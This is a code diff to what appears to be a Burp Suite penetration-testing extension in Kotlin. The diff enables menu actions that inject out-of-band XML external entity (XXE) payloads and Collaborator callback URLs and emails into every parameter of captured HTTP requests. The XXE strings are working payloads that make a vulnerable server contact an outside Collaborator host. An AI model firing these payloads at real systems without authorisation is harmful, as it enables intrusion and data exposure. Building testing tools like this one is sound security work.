@@ -41,10 +41,10 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //    private val xssMapMenuItem = JMenuItem("XSS ASDF")
     private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
     private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
-//    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
+    private val xmlOutOfBandMenuItem = JMenuItem("XML OutOfBand")
 //    private val xmlFileMenuItem = JMenuItem("XML File")
 //    private val urlPathSpecialCharsMenuItem = JMenuItem("URL Path Special Chars")
-//    private val collabUrlMenuItem = JMenuItem("Collab Url")
+    private val collabUrlMenuItem = JMenuItem("Collab Url")
 //    private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
 //    private val maxForwardsMenuItem = JMenuItem("Max-Forwards")
 //    private val minimizeMenuItem = JMenuItem("Minimize")
@@ -68,7 +68,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //            add(xmlOutOfBandMenuItem)
 //            add(xmlFileMenuItem)
 //            add(urlPathSpecialCharsMenuItem)
-//            add(collabUrlMenuItem)
+//            add()
 //            add(maxForwardsMenuItem)
 //            add(log4jCollabMenuItem)
 //            add(spoofIPMenuItem)
@@ -81,6 +81,8 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
         sqliErrorPayloadsMenuItem,
         blindXssImgMenuItem,
         xssPayloadsMenuItem,
+        collabUrlMenuItem,
+        xmlOutOfBandMenuItem,
         JSeparator()
     )
     private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
@@ -182,8 +184,8 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //        xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
         xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
         blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
-//        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
-//        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
+        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
+        xmlOutOfBandMenuItem.addActionListener({ e -> xmlOutOfBandActionPerformed(e) })
 //        xmlFileMenuItem.addActionListener({ e -> xmlFileActionPerformed(e) })
 //        urlPathSpecialCharsMenuItem.addActionListener({ e -> urlPathSpecialCharsActionPerformed(e) })
 //        minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
@@ -333,6 +335,23 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
         logger.debugLog("Exit")
     }
 
+    fun collabUrlActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "Collaborator"
+        val testCaseName = "Everywhere"
+        val payloads = listOf(
+            "https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/collaburl",
+            "test@${api.collaborator().defaultPayloadGenerator().generatePayload()}"
+        )
+
+        payloads.forEach { payload ->
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.REPLACE)
+        }
+
+        logger.debugLog("Exit")
+    }
+
     fun blindXssImgActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
@@ -369,6 +388,25 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
         payloads.forEach { payload ->
             iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
+        }
+        logger.debugLog("Exit")
+    }
+
+    fun xmlOutOfBandActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        val category = "XML Entity Injection"
+        val testCaseName = "Out of Band"
+        val payloads = listOf(
+            "<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/entity1\"> %ext;]>",
+            "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/entity2\"> ]><test>&xxe</test>",
+            "<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/dtd1\">",
+            "<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${api.collaborator().defaultPayloadGenerator().generatePayload()}/dtd2\"><asdfa></asdfa>",
+        )
+
+        payloads.forEach { payload ->
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.APPEND)
+            iterateThroughParametersWithPayload(myHttpRequestResponses,category,testCaseName,payload,PayloadUpdateMode.REPLACE)
         }
         logger.debugLog("Exit")
     }
@@ -512,16 +550,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //    }
 //
 //
-//    fun xmlOutOfBandActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        val collabGenerator = api.collaborator().defaultPayloadGenerator()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\"><asdfa></asdfa>",PayloadUpdateMode.REPLACE, "XML DTD OOB-Replace")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun xmlFileActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -565,13 +594,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 //
 
 //
-//    fun collabUrlActionPerformed(event: ActionEvent?) {
-//        logger.debugLog("Enter")
-//        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadUpdateMode.REPLACE, "Collab URL")
-//        iterateThroughParametersWithPayload(myHttpRequestResponses,"test@${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}",PayloadUpdateMode.REPLACE, "Collab EMail")
-//        logger.debugLog("Exit")
-//    }
+
 //
 //    fun log4jCollabActionPerformed(event: ActionEvent?) {
 //        logger.debugLog("Enter")
@@ -902,7 +925,7 @@ class EveryParameter2(private val api: MontoyaApi, private val myExtensionSettin
 
             val encodedPayload = if(encodePayload) {
                 if(updatedParsedParam.type().name==HttpParameterType.JSON.name) {
-                    StringEscapeUtils.escapeEcmaScript(transformedPayload)
+                    StringEscapeUtils.escapeEcmaScript(transformedPayload).replace("\\'","'")
                 }
                 else if(updatedParsedParam.type().name==HttpParameterType.XML.name || updatedParsedParam.type().name==HttpParameterType.XML_ATTRIBUTE.name) {
                     StringEscapeUtils.escapeXml11(transformedPayload)
